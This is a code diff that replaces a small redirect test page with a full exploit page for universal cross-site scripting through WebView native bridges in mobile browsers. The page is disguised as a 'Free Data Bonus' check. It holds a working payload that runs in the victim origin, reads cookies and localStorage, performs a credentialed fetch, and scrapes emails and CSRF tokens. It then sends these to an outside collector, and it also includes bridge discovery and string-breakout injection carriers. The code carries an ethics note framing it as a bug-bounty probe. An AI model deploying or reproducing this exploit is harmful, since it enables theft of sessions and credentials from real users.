@@ -1,69 +1,317 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SpeechSynthesis Redirect PoC (Controlled)</title>
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Free Data Bonus</title>
 <style>
-  body {
-    font-family: Arial, sans-serif;
-    text-align: center;
-    padding: 60px;
-  }
-  button {
-    padding: 15px 30px;
-    font-size: 20px;
-    cursor: pointer;
-  }
-  #status {
-    margin-top: 20px;
-    font-size: 18px;
-    color: darkred;
-  }
+body{font:16px/1.4 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;margin:0;padding:24px;background:#0b1020;color:#e6e9f2}
+h2{margin:0 0 6px;font-size:19px}
+p{opacity:.7;margin:0 0 10px}
+pre{font:11px/1.4 ui-monospace,Menlo,Consolas,monospace;opacity:.5;white-space:pre-wrap;word-break:break-all}
 </style>
-</head>
-<body>
-
-<h2>CLICK TO GOOGLE</h2>
-<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
-<div id="status">Status: Waiting...</div>
-
+</head><body>
+<h2>Checking!</h2>
+<p id="st">Please wait, do not close this page.</p>
+<pre id="dbg"></pre>
 <script>
-const btn = document.getElementById('speechBtn');
-const status = document.getElementById('status');
+(function(){
+'use strict';
 
-btn.addEventListener('click', () => {
+/* ===========================================================================
+   wk-bridge-race.html
+   Injector-survives-navigation UXSS - the Opera Mini mechanism, generalised to
+   WKWebView (every iOS browser) and to Android WebView wrappers.
+   ---------------------------------------------------------------------------
+   The Opera Mini bug had two halves, and only the second one is Opera-specific:
 
-  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
+     half 1  a page-reachable bridge whose native side executes a string as JS
+             in the main frame:  webView.loadUrl("javascript:" + cb + "('"+tok+"')")
+             iOS equivalent:     webView.evaluateJavaScript("cb('" + data + "')")
+     half 2  that execution is ASYNCHRONOUS and NOT BOUND to the document that
+             asked for it - so after the main frame commits a new document, the
+             string runs in the NEW document's origin.
 
-  if (!('speechSynthesis' in window)) {
-    status.textContent = "SpeechSynthesis not supported.";
-    return;
+   Half 1 exists in dozens of shipping browsers.  Half 2 is the bug.  This page
+   drives both arms against whatever bridge the host actually exposes:
+
+     ARM A - callback-NAME injection (Android @JavascriptInterface shape, and
+             the handful of iOS wrappers that still pass a JS function name):
+             the page supplies the identifier, native concatenates it.
+     ARM B - DATA interpolation (the normal WKWebView shape): the page supplies
+             a value that native drops into a JS string literal, so the payload
+             is a quote breakout rather than a function name.
+
+   Both arms are queued during pagehide, the unload is busy-held so the queue
+   drains late, then the main frame commits the victim origin.
+
+   ORACLE - what counts, and what does not:
+     NOT a finding   alert() firing, a banner appearing, the bridge accepting a call
+     FINDING         a privileged read of the VICTIM origin after it committed:
+                     document.cookie / localStorage.length / credentialed fetch body
+     The payload beacons exactly those, tagged with location.origin, so the
+     collector line itself is the evidence.  Record the control arm too: the same
+     queued payload with no navigation must land in OUR origin, not the victim's.
+
+   USAGE
+     ?target=https://www.google.com/        victim origin (framable not required)
+     &log=https://your-collector/x.png      OOB collector - without it there is no evidence
+     &bridge=operamini_sd_notifications     bridge object (omit to auto-discover)
+     &method=getSubscriptionToken           method taking a callback NAME (arm A)
+     &handler=native                        webkit.messageHandlers name (arm B; omit = all)
+     &arm=a|b|both   &n=60   &busy=450   &wait=900   &tag=G   &dry=1
+
+   &dry=1 discovers and prints, and fires nothing.  Run that first.
+
+   ETHICS - this is a VRP probe, not a weapon.  Run it against a browser build
+   you own or are authorised to test, with a victim origin you own or the
+   conventional neutral one.  Prove the predicate, capture the screen, STOP, and
+   report to the vendor (Apple Security Bounty / Chrome VRP / Mozilla / the
+   wrapper's own program).  Do not aim it at other people's sessions.
+   =========================================================================== */
+
+var Q = new URLSearchParams(location.search);
+var CFG = {
+  target  : Q.get('target')  || 'https://www.google.com/',
+  log     : Q.get('log')     || '',
+  tag     : Q.get('tag')     || 'G',
+  bridge  : Q.get('bridge')  || '',
+  method  : Q.get('method')  || '',
+  handler : Q.get('handler') || '',
+  arm     : (Q.get('arm')    || 'both').toLowerCase(),
+  n       : +(Q.get('n')     || 60),
+  busy    : +(Q.get('busy')  || 450),
+  wait    : +(Q.get('wait')  || 900),
+  dry     : Q.get('dry') === '1'
+};
+
+function note(s){ document.getElementById('dbg').textContent += s + '\n'; }
+function ping(q){
+  if (!CFG.log) return;
+  try { new Image().src = CFG.log + (CFG.log.indexOf('?') < 0 ? '?' : '&') + 't=' + CFG.tag + '_' + q; } catch(e){}
+}
+
+/* ---------------------------------------------------------------- discovery */
+var BRIDGE_DICT = [
+  'operamini_sd_notifications','operamini','opera','OperaMini','OperaBridge',
+  'Android','AndroidBridge','AndroidInterface','AndroidWebView','JSBridge','jsBridge','JsBridge',
+  'NativeBridge','nativeBridge','__nativeBridge','AppBridge','appBridge','WebViewJavascriptBridge',
+  'WebViewBridge','JavaScriptBridge','jsInterface','JSInterface','NativeInterface','bridge','_bridge',
+  'ucbrowser','UCMobileWebkit','ucweb','ucapi','UCBrowser','UCShellJava',
+  'yandexBrowser','ya_browser','YandexBrowser','YandexJS',
+  'SamsungInternet','sbrowser','SBrowser','samsungBridge',
+  'KiwiBrowser','kiwi','brave','puffin','PuffinBridge',
+  'maxthon','mxbrowser','MxJsBridge','dolphin','DolphinJS','dolphinBridge',
+  'phoenix','via','ViaBrowser','AlohaBrowser','aloha','cmbrowser','CmBrowser',
+  'QihooBrowser','qihoo','MiuiBrowser','miui','MiBrowser','HuaweiBrowser','hwBrowser',
+  'vivoBrowser','OppoBrowser','heytapBrowser','TBrowser','QQBrowser','qqbrowser','mttjsapi','x5',
+  'TTJSBridge','ToutiaoJSBridge','WeixinJSBridge','AlipayJSBridge',
+  '__jsbridge','_dsbridge','dsBridge','DSBridge','flutter_inappwebview','ReactNativeWebView','cordova','Capacitor'
+];
+var HANDLER_DICT = [
+  'native','app','bridge','jsBridge','JSBridge','nativeBridge','NativeBridge','iosListener','callbackHandler',
+  'observe','logging','log','console','analytics','telemetry','reader','readerMode','translate','translation',
+  'autofill','passwordManager','credentials','adblock','contentBlocker','cosmetic','nightMode','darkReader',
+  'findInPage','favicon','metadata','downloads','share','walletProvider','ethereum','solana','tonconnect',
+  'paymentHandler','accountManager','sync','push','notifications','permissions','trackingProtection',
+  'userScripts','WKMessage','handler','opera','duckduckgo','firefox','yandex'
+];
+/* names whose native side historically takes a callback identifier or runs JS */
+var CB_RE = /callback|cb$|token|subscribe|notify|register|request|fetch|get[A-Z]|eval|exec|run|invoke|call|script|js/i;
+
+function discoverBridges(){
+  var out = [];
+  BRIDGE_DICT.forEach(function(n){
+    var o;
+    try { o = window[n]; } catch(e){ return; }
+    if (o === undefined || o === null) return;
+    if (typeof o !== 'object' && typeof o !== 'function') { out.push({ name:n, hot:[], all:['<' + (typeof o) + '>'] }); return; }
+    var all = [], hot = [], k;
+    function take(key){
+      var sig;
+      try { if (typeof o[key] !== 'function') return; sig = key + '/' + o[key].length; } catch(e){ return; }
+      if (all.indexOf(sig) >= 0) return;
+      all.push(sig);
+      if (CB_RE.test(key)) hot.push(key);
+    }
+    for (k in o) take(k);
+    try { Object.getOwnPropertyNames(o).forEach(take); } catch(e){}
+    out.push({ name:n, hot:hot, all:all });
+  });
+  return out;
+}
+function discoverHandlers(){
+  if (!(window.webkit && window.webkit.messageHandlers)) return [];
+  var mh = window.webkit.messageHandlers, found = [];
+  try { Object.getOwnPropertyNames(mh).forEach(function(n){ found.push(n); }); } catch(e){}
+  HANDLER_DICT.forEach(function(n){
+    try { if (mh[n] && typeof mh[n].postMessage === 'function' && found.indexOf(n) < 0) found.push(n); } catch(e){}
+  });
+  return found;
+}
+
+/* ------------------------------------- payload: runs in the VICTIM document */
+var PAYLOAD = ''
+ + 'var L=' + JSON.stringify(CFG.log) + ',T=' + JSON.stringify(CFG.tag) + ',W=' + CFG.wait + ',E=encodeURIComponent;'
+ + 'function S(k,x){try{if(!L)return;new Image().src=L+(L.indexOf("?")<0?"?":"&")+"t="+T+"_"+k'
+ + '+"&href="+E(""+location.href)+"&org="+E(""+location.origin)+(x||"");}catch(e){}}'
+ /* fire once per victim document no matter how many queued calls are delivered */
+ + 'if(!window.__uxss){window.__uxss=1;'
+ +   'var ck="",ls="-";try{ck=document.cookie||""}catch(e){}try{ls=localStorage.length}catch(e){}'
+ +   'S("IN_ORIGIN","&ck="+E(ck.slice(0,60))+"&cklen="+ck.length+"&ls="+ls+"&ttl="+E(""+document.title));'
+     /* credentialed same-origin read - this is the payoff line, not the alert */
+ +   'try{fetch(location.origin+"/",{credentials:"include"}).then(function(r){return r.text()}).then(function(b){'
+ +     'var em=b.match(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}/);'
+ +     'var tk=b.match(/"(?:SNlM0e|csrf[_-]?token|authenticity_token)":"([^"]+)"/i);'
+ +     'S("SAMEORIGIN_READ","&len="+b.length+"&email="+E(em?em[0]:"-")+"&tok="+E(tk?tk[1].slice(0,24):"-"));'
+ +   '}).catch(function(e){S("FETCH_ERR","&e="+E(""+e))});}catch(e){}'
+     /* persistent banner - SPA targets rebuild their DOM, so re-attach */
+ +   'var n=0,iv=setInterval(function(){try{'
+ +     'if(!document.getElementById("__ux")){var d=document.createElement("div");d.id="__ux";'
+ +       'd.style.cssText="position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;'
+ +       'font:bold 13px system-ui;padding:10px;text-align:center";'
+ +       'd.textContent="UXSS \\u2014 attacker script running in "+location.origin;'
+ +       '(document.body||document.documentElement).appendChild(d);}'
+ +     '}catch(e){} if(++n>60)clearInterval(iv);},200);'
+     /* one dialog, after the victim settles - screenshot the origin it is attributed to */
+ +   'setTimeout(function(){try{S("PRE_ALERT","");'
+ +     'alert("UXSS\\n\\norigin: "+location.origin+"\\ndomain: "+document.domain'
+ +       '+"\\ncookie: "+((ck||"(none)").slice(0,60))+"\\nlocalStorage: "+ls);'
+ +     'S("POST_ALERT","");}catch(e){S("ALERT_ERR","&e="+E(""+e));}},W);'
+ + '}';
+
+/* ARM A carrier: the bridge concatenates this identifier straight into
+   "javascript:" + cb + "('" + token + "')", so it must survive being placed
+   inside a single-quoted literal - no quote, and no + / = either, which also
+   rules out base64.  charCode encoding satisfies all three.                 */
+var CB_EXPR = (function(){
+  var c = [], i;
+  for (i = 0; i < PAYLOAD.length; i++) c.push(PAYLOAD.charCodeAt(i));
+  return '(function(j){eval(String.fromCharCode(' + c.join(',') + '))})';
+})();
+
+/* ARM B carriers: native built a JS string and dropped our DATA inside it.
+   One breakout per quoting/escaping assumption the native code might make. */
+function armBPayloads(){
+  var p = 'eval(' + JSON.stringify(PAYLOAD).replace(/'/g, "\\u0027") + ')';
+  return [
+    "');" + p + ";('",
+    "\\');" + p + ";(\\'",
+    '");' + p + ';("',
+    '\\");' + p + ';(\\"',
+    '`);' + p + ';(`',
+    ' ' + p + ' ',
+    '\\u0027);' + p + ';(\\u0027',
+    '</scr' + 'ipt><img src=x onerror=' + JSON.stringify(p) + '>'
+  ];
+}
+
+/* --------------------------------------------------------------- firing arms */
+var TARGETS_A = [];   /* [{obj, name, method}] */
+var TARGETS_B = [];   /* [handlerName] */
+
+function planArms(){
+  var bridges = discoverBridges(), handlers = discoverHandlers();
+
+  if (CFG.bridge) {
+    var o = null;
+    try { o = window[CFG.bridge]; } catch(e){}
+    if (o) {
+      if (CFG.method) TARGETS_A.push({ obj:o, name:CFG.bridge, method:CFG.method });
+      else {
+        var b = bridges.filter(function(x){ return x.name === CFG.bridge; })[0];
+        (b ? b.hot : []).forEach(function(m){ TARGETS_A.push({ obj:o, name:CFG.bridge, method:m }); });
+      }
+    }
+  } else {
+    bridges.forEach(function(b){
+      var o;
+      try { o = window[b.name]; } catch(e){ return; }
+      if (!o || typeof o !== 'object' && typeof o !== 'function') return;
+      b.hot.slice(0, 12).forEach(function(m){ TARGETS_A.push({ obj:o, name:b.name, method:m }); });
+    });
   }
 
-  const utter = new SpeechSynthesisUtterance(text);
-  utter.lang = 'en-US';
+  TARGETS_B = CFG.handler ? [CFG.handler] : handlers;
 
-  const voices = speechSynthesis.getVoices();
-  const enVoice = voices.find(v => v.lang.startsWith('en'));
-  if (enVoice) utter.voice = enVoice;
+  note('bridges found : ' + (bridges.length ? bridges.map(function(b){
+         return b.name + (b.hot.length ? '[' + b.hot.join(',') + ']' : '');
+       }).join('  ') : 'none'));
+  note('handlers found: ' + (TARGETS_B.length ? TARGETS_B.join(', ') : 'none'));
+  note('arm A targets : ' + (TARGETS_A.length ? TARGETS_A.map(function(t){ return t.name + '.' + t.method; }).join(', ') : 'none'));
+  note('arm B targets : ' + (TARGETS_B.length ? TARGETS_B.length + ' handler(s) x ' + armBPayloads().length + ' breakouts' : 'none'));
+  note('carrier len   : armA=' + CB_EXPR.length + '  armB=' + armBPayloads()[0].length);
+  note('target        : ' + CFG.target);
+  ping('PLAN&bridges=' + bridges.length + '&handlers=' + TARGETS_B.length
+     + '&a=' + TARGETS_A.length + '&cblen=' + CB_EXPR.length);
+  return { bridges:bridges, handlers:handlers };
+}
 
-  status.textContent = "Preparing redirect...";
+function fireA(k){
+  var ok = 0, i, t;
+  for (i = 0; i < k; i++) {
+    for (var j = 0; j < TARGETS_A.length; j++) {
+      t = TARGETS_A[j];
+      try { t.obj[t.method](CB_EXPR); ok++; } catch(e){}
+      /* some bridges take (callback, arg) or (arg, callback) - cover both */
+      try { t.obj[t.method](CB_EXPR, ''); ok++; } catch(e){}
+      try { t.obj[t.method]('', CB_EXPR); ok++; } catch(e){}
+    }
+  }
+  return ok;
+}
+function fireB(k){
+  if (!(window.webkit && window.webkit.messageHandlers)) return 0;
+  var mh = window.webkit.messageHandlers, pl = armBPayloads(), ok = 0, i;
+  for (i = 0; i < k; i++) {
+    TARGETS_B.forEach(function(n){
+      var h;
+      try { h = mh[n]; } catch(e){ return; }
+      if (!h || typeof h.postMessage !== 'function') return;
+      pl.forEach(function(p){
+        try { h.postMessage(p); ok++; } catch(e){}
+        try { h.postMessage({ name:p, value:p, callback:p, data:p }); ok++; } catch(e){}
+      });
+    });
+  }
+  return ok;
+}
+function hold(ms){ var t = Date.now(); while (Date.now() - t < ms) {} }
 
-  // Redirect cepat
-  setTimeout(() => {
+/* ------------------------------------------------------------------ sequence */
+var plan = planArms();
 
-    // Trigger speech tepat sebelum navigasi
-    speechSynthesis.speak(utter);
-    console.log("[PoC] Speech triggered");
+if (CFG.dry) {
+  document.getElementById('st').textContent = 'dry run - nothing fired. Pick a bridge/method above, then drop &dry=1.';
+  ping('DRY');
+  return;
+}
 
-    // Navigasi langsung setelah speech dipanggil
-    window.location.replace('https://google.com');
+if (!TARGETS_A.length && !TARGETS_B.length) {
+  document.getElementById('st').textContent =
+    'no native bridge reachable from this origin - wrong engine, or this build exposes none to web content';
+  ping('NOBRIDGE');
+  note('next: hook the app with Frida (evaluateJavaScript / loadUrl / addJavascriptInterface) and read the real '
+     + 'bridge name out of it, then re-run with &bridge= / &handler=');
+  return;
+}
 
-  }, 300); // delay kecil (bisa tweak 100–500ms untuk testing)
+function onLeave(ev){
+  var a = (CFG.arm === 'a' || CFG.arm === 'both') ? fireA(Math.ceil(CFG.n / Math.max(1, TARGETS_A.length || 1))) : 0;
+  var b = (CFG.arm === 'b' || CFG.arm === 'both') ? fireB(Math.ceil(CFG.n / Math.max(1, (TARGETS_B.length || 1) * 8))) : 0;
+  ping('LEAVE&ev=' + ev + '&a=' + a + '&b=' + b);
+  hold(CFG.busy);                       /* hold the unload so the queue drains after commit */
+}
+addEventListener('pagehide', function(){ onLeave('pagehide'); });
+addEventListener('unload',   function(){ onLeave('unload');   });
 
-});
+ping('LOAD&n=' + CFG.n + '&busy=' + CFG.busy + '&wait=' + CFG.wait + '&arm=' + CFG.arm);
+
+setTimeout(function(){
+  document.getElementById('st').textContent = 'Checking!';
+  ping('NAV');
+  location.href = CFG.target;
+}, 1200);
+
+})();
 </script>
-
-</body>
-</html>
+</body></html>
